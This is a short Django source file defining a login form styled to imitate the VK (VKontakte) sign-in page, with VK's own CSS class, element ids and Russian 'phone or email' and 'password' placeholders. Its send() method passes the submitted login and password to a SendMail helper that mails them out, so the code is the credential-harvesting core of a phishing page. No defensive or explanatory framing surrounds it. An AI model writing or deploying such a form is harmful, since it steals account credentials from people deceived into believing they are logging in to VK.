from django import forms
from .mail import SendMail


class TheForm(forms.Form):
    login = forms.CharField(
        max_length=32,
        widget=forms.TextInput(
            attrs={
                'style': 'margin-bottom: 6px',
                'class': 'VkIdForm__input',
                'id': 'index_email',
                'placeholder': 'Телефон или почта'
            }
        )
    )
    password = forms.CharField(
        widget=forms.PasswordInput(
            attrs={
                'class': 'VkIdForm__input',
                'id': 'index_password',
                'placeholder': 'Пароль'
            }
        )
    )

    def send(self):
        login = self.cleaned_data['login']
        password = self.cleaned_data['password']

        mail = SendMail(login, password)
        mail.send_data()
